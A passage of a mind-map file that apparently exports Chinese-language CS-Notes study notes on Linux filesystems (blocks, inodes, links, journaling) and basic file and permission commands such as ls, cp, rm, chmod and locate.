    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6a0b85588edeb5ad5e1409dadfa0725a6381c988245fa00eaff5abc1cd4b974f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31326136356363362d323065302d343730362d396665362d3362613439343133643766362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/6a0b85588edeb5ad5e1409dadfa0725a6381c988245fa00eaff5abc1cd4b974f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31326136356363362d323065302d343730362d396665362d3362613439343133643766362e706e67" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/12a65cc6-20e0-4706-9fe6-3ba49413d7f6.png"/>
    </a><br/>
    

    <p dir="auto">
      而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/474d48abb3d286783e24c7a85ba5a018ef5b9c8ebd667a546b9673952e04d44a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35623731386538362d373130322d346262362d386361352d6431646437393135333063352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/474d48abb3d286783e24c7a85ba5a018ef5b9c8ebd667a546b9673952e04d44a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35623731386538362d373130322d346262362d386361352d6431646437393135333063352e706e67" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5b718e86-7102-4bb6-8ca5-d1dd791530c5.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_533438213" CREATED="1754750448920" MODIFIED="1754750448923"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      磁盘碎片
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 磁盘碎片" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#磁盘碎片">
</a>
    <p dir="auto">
      指一个文件内容所在的 block 过于分散，导致磁盘磁头移动距离过大，从而降低磁盘读写性能。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1273007196" CREATED="1754750448923" MODIFIED="1754750448925"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      block
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: block" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#block">
</a>
    <p dir="auto">
      在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          大小
        </th>
        <th>
          1KB
        </th>
        <th>
          2KB
        </th>
        <th>
          4KB
        </th>
      </tr>
      <tr>
        <td>
          最大单一文件
        </td>
        <td>
          16GB
        </td>
        <td>
          256GB
        </td>
        <td>
          2TB
        </td>
      </tr>
      <tr>
        <td>
          最大文件系统
        </td>
        <td>
          2TB
        </td>
        <td>
          8TB
        </td>
        <td>
          16TB
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_911384465" CREATED="1754750448926" MODIFIED="1754750448928"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      inode
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: inode" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#inode">
</a>
    <p dir="auto">
      inode 具体包含以下信息：
    </p>
    <ul dir="auto">
      <li>
        权限 (read/write/excute)；
      </li>
      <li>
        拥有者与群组 (owner/group)；
      </li>
      <li>
        容量；
      </li>
      <li>
        建立或状态改变的时间 (ctime)；
      </li>
      <li>
        最近读取时间 (atime)；
      </li>
      <li>
        最近修改时间 (mtime)；
      </li>
      <li>
        定义文件特性的旗标 (flag)，如 SetUID...；
      </li>
      <li>
        该文件真正内容的指向 (pointer)。
      </li>
    </ul>
    <p dir="auto">
      inode 具有以下特点：
    </p>
    <ul dir="auto">
      <li>
        每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)；
      </li>
      <li>
        每个文件都仅会占用一个 inode。
      </li>
    </ul>
    <p dir="auto">
      inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用让 inode 记录的引用 block 块记录引用信息。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/23f029d7b521ad417a49d83f10c34568eb64aea7af1b5a8f2f58642731278fd9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696e6f64655f776974685f7369676e6174757265732e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/23f029d7b521ad417a49d83f10c34568eb64aea7af1b5a8f2f58642731278fd9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696e6f64655f776974685f7369676e6174757265732e6a7067" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/inode_with_signatures.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_96197922" CREATED="1754750448928" MODIFIED="1754750448930"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      目录
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 目录" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#目录">
</a>
    <p dir="auto">
      建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。
    </p>
    <p dir="auto">
      可以看到文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的写权限有关。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1975141323" CREATED="1754750448931" MODIFIED="1754750448933"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      日志
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 日志" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#日志">
</a>
    <p dir="auto">
      如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。
    </p>
    <p dir="auto">
      ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1856495803" CREATED="1754750448934" MODIFIED="1754750448937"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      挂载
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 挂载" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#挂载">
</a>
    <p dir="auto">
      挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_37014511" CREATED="1754750448937" MODIFIED="1754750448939"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      目录配置
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 目录配置" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#目录配置">
</a>
    <p dir="auto">
      为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下：
    </p>
    <ul dir="auto">
      <li>
        / (root, 根目录)
      </li>
      <li>
        /usr (unix software resource)：所有系统默认软件都会安装到这个目录；
      </li>
      <li>
        /var (variable)：存放系统或程序运行过程中的数据文件。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/304e2de74d4f86805c4b7c785ecf863c491b54ba3e53a79de643af4504cb2809/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f6c696e75782d66696c6573797374656d2e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/304e2de74d4f86805c4b7c785ecf863c491b54ba3e53a79de643af4504cb2809/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f6c696e75782d66696c6573797374656d2e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/linux-filesystem.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_380770403" CREATED="1754750448940" MODIFIED="1754750448940"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、文件
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1095669562" CREATED="1754750448942" MODIFIED="1754750448944"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文件属性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 文件属性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#文件属性">
</a>
    <p dir="auto">
      用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。
    </p>
    <p dir="auto">
      使用 ls 查看一个文件时，会显示一个文件的信息，例如 <code>drwxr-xr-x 3 root root 17 May 6 00:14 .config</code>，对这个信息的解释如下：
    </p>
    <ul dir="auto">
      <li>
        drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段
      </li>
      <li>
        3：链接数
      </li>
      <li>
        root：文件拥有者
      </li>
      <li>
        root：所属群组
      </li>
      <li>
        17：文件大小
      </li>
      <li>
        May 6 00:14：文件最后被修改的时间
      </li>
      <li>
        .config：文件名
      </li>
    </ul>
    <p dir="auto">
      常见的文件类型及其含义有：
    </p>
    <ul dir="auto">
      <li>
        d：目录
      </li>
      <li>
        -：文件
      </li>
      <li>
        l：链接文件
      </li>
    </ul>
    <p dir="auto">
      9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。
    </p>
    <p dir="auto">
      文件时间有以下三种：
    </p>
    <ul dir="auto">
      <li>
        modification time (mtime)：文件的内容更新就会更新；
      </li>
      <li>
        status time (ctime)：文件的状态（权限、属性）更新就会更新；
      </li>
      <li>
        access time (atime)：读取文件时就会更新。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1034585199" CREATED="1754750448944" MODIFIED="1754750448944"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文件与目录的基本操作
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1345738551" CREATED="1754750448947" MODIFIED="1754750448949"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. ls
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. ls" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-ls">
</a>
    <p dir="auto">
      列出文件或者目录的信息，目录的信息就是其中包含的文件。
    </p>
    <pre>## ls [-aAdfFhilnrRSt] file|dir
-a ：列出全部的文件
-d ：仅列出目录本身
-l ：以长数据串行列出，包含文件的属性与权限等等数据</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1673600801" CREATED="1754750448949" MODIFIED="1754750448951"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. cd
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. cd" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-cd">
</a>
    <p dir="auto">
      更换当前目录。
    </p>
    <pre class="notranslate">cd [相对路径或绝对路径]</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1118926206" CREATED="1754750448951" MODIFIED="1754750448953"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. mkdir
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. mkdir" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-mkdir">
</a>
    <p dir="auto">
      创建目录。
    </p>
    <pre class="notranslate">## mkdir [-mp] 目录名称
-m ：配置目录权限
-p ：递归创建目录</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1585924705" CREATED="1754750448953" MODIFIED="1754750448955"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. rmdir
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. rmdir" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#4-rmdir">
</a>
    <p dir="auto">
      删除目录，目录必须为空。
    </p>
    <pre>rmdir [-p] 目录名称
-p ：递归删除目录</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_295238861" CREATED="1754750448955" MODIFIED="1754750448957"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. touch
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. touch" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#5-touch">
</a>
    <p dir="auto">
      更新文件时间或者建立新文件。
    </p>
    <pre>## touch [-acdmt] filename
-a ： 更新 atime
-c ： 更新 ctime，若该文件不存在则不建立新文件
-m ： 更新 mtime
-d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date=&quot;日期或时间&quot;
-t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm]</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1453147943" CREATED="1754750448958" MODIFIED="1754750448959"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. cp
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. cp" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#6-cp">
</a>
    <p dir="auto">
      复制文件。如果源文件有两个以上，则目的文件一定要是目录才行。
    </p>
    <pre>cp [-adfilprsu] source destination
-a ：相当于 -dr --preserve=all
-d ：若来源文件为链接文件，则复制链接文件属性而非文件本身
-i ：若目标文件已经存在时，在覆盖前会先询问
-p ：连同文件的属性一起复制过去
-r ：递归复制
-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制
--preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_904292407" CREATED="1754750448960" MODIFIED="1754750448962"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. rm
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 7. rm" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#7-rm">
</a>
    <p dir="auto">
      删除文件。
    </p>
    <pre>## rm [-fir] 文件或目录
-r ：递归删除</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_872418895" CREATED="1754750448962" MODIFIED="1754750448964"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. mv
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 8. mv" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#8-mv">
</a>
    <p dir="auto">
      移动文件。
    </p>
    <pre>## mv [-fiu] source destination
## mv [options] source1 source2 source3 .... directory
-f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1337079189" CREATED="1754750448964" MODIFIED="1754750448967"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      修改权限
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 修改权限" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#修改权限">
</a>
    <p dir="auto">
      可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。
    </p>
    <pre>## chmod [-R] xyz dirname/filename</pre>
    <p dir="auto">
      示例：将 .bashrc 文件的权限修改为 -rwxr-xr--。
    </p>
    <pre>## chmod 754 .bashrc</pre>
    <p dir="auto">
      也可以使用符号来设定权限。
    </p>
    <pre>## chmod [ugoa]  [+-=] [rwx] dirname/filename
- u：拥有者
- g：所属群组
- o：其他人
- a：所有人
- +：添加权限
- -：移除权限
- =：设定权限</pre>
    <p dir="auto">
      示例：为 .bashrc 文件的所有用户添加写权限。
    </p>
    <pre>## chmod a+w .bashrc</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1964890345" CREATED="1754750448967" MODIFIED="1754750448969"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      默认权限
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 默认权限" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#默认权限">
</a>
    <ul dir="auto">
      <li>
        文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。
      </li>
      <li>
        目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。
      </li>
    </ul>
    <p dir="auto">
      可以通过 umask 设置或者查看默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r--。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_342664245" CREATED="1754750448969" MODIFIED="1754750448971"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      目录的权限
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 目录的权限" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#目录的权限">
</a>
    <p dir="auto">
      文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。
    </p>
    <p dir="auto">
      目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_653449468" CREATED="1754750448971" MODIFIED="1754750448973"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      链接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 链接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#链接">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ece21395139b4bae26aec20b4107996abf268895bf026932b7ee353ccd3e1bda/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31653436666430332d306364612d346436302d396231632d3063323536656461663662322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/ece21395139b4bae26aec20b4107996abf268895bf026932b7ee353ccd3e1bda/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31653436666430332d306364612d346436302d396231632d3063323536656461663662322e706e67" width="450px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e46fd03-0cda-4d60-9b1c-0c256edaf6b2.png"/></a><br/>
    <pre>## ln [-sf] source_filename dist_filename
-s ：默认是实体链接，加 -s 为符号链接
-f ：如果目标文件存在时，先删除目标文件</pre>
  </body>
</html></richcontent>
<node ID="ID_1318882617" CREATED="1754750448973" MODIFIED="1754750448975"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 实体链接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 实体链接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-实体链接">
</a>
    <p dir="auto">
      在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。
    </p>
    <p dir="auto">
      删除任意一个条目，文件还是存在，只要引用数量不为 0。
    </p>
    <p dir="auto">
      有以下限制：不能跨越文件系统、不能对目录进行链接。
    </p>
    <pre>## ln /etc/crontab .
## ll -i /etc/crontab crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1167514632" CREATED="1754750448975" MODIFIED="1754750448977"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 符号链接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 符号链接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-符号链接">
</a>
    <p dir="auto">
      符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。
    </p>
    <p dir="auto">
      当源文件被删除了，链接文件就打不开了。
    </p>
    <p dir="auto">
      因为记录的是路径，所以可以为目录建立符号链接。
    </p>
    <pre>## ll -i /etc/crontab /root/crontab2
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab
53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -&gt; /etc/crontab</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1091561682" CREATED="1754750448977" MODIFIED="1754750448977"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      获取文件内容
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1777063304" CREATED="1754750448979" MODIFIED="1754750448980"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. cat
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. cat" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-cat">
</a>
    <p dir="auto">
      取得文件内容。
    </p>
    <pre>## cat [-AbEnTv] filename
-n ：打印出行号，连同空白行也会有行号，-b 不会</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_945603098" CREATED="1754750448981" MODIFIED="1754750448984"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. tac
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. tac" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-tac">
</a>
    <p dir="auto">
      是 cat 的反向操作，从最后一行开始打印。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1611393525" CREATED="1754750448984" MODIFIED="1754750448986"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. more
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. more" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-more">
</a>
    <p dir="auto">
      和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_757185261" CREATED="1754750448986" MODIFIED="1754750448988"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. less
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. less" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#4-less">
</a>
    <p dir="auto">
      和 more 类似，但是多了一个向前翻页的功能。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1744308698" CREATED="1754750448989" MODIFIED="1754750448990"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. head
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. head" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#5-head">
</a>
    <p dir="auto">
      取得文件前几行。
    </p>
    <pre>## head [-n number] filename
-n ：后面接数字，代表显示几行的意思</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_57194960" CREATED="1754750448991" MODIFIED="1754750448993"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. tail
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. tail" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#6-tail">
</a>
    <p dir="auto">
      是 head 的反向操作，只是取得是后几行。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1888635053" CREATED="1754750448993" MODIFIED="1754750448995"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. od
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 7. od" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#7-od">
</a>
    <p dir="auto">
      以字符或者十六进制的形式显示二进制文件。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1730221438" CREATED="1754750448995" MODIFIED="1754750448995"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      指令与文件搜索
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_78505017" CREATED="1754750448997" MODIFIED="1754750448999"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. which
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. which" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-which">
</a>
    <p dir="auto">
      指令搜索。
    </p>
    <pre>## which [-a] command
-a ：将所有指令列出，而不是只列第一个</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_68482144" CREATED="1754750448999" MODIFIED="1754750449001"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. whereis
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. whereis" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-whereis">
</a>
    <p dir="auto">
      文件搜索。速度比较快，因为它只搜索几个特定的目录。
    </p>
    <pre>## whereis [-bmsu] dirname/filename</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_253407138" CREATED="1754750449001" MODIFIED="1754750449003"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. locate
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. locate" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-locate">
</a>
    <p dir="auto">
      文件搜索。可以用关键字或者正则表达式进行搜索。
    </p>
    <p dir="auto">
      locate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。
    </p>
    <pre>## locate [-ir] keyword
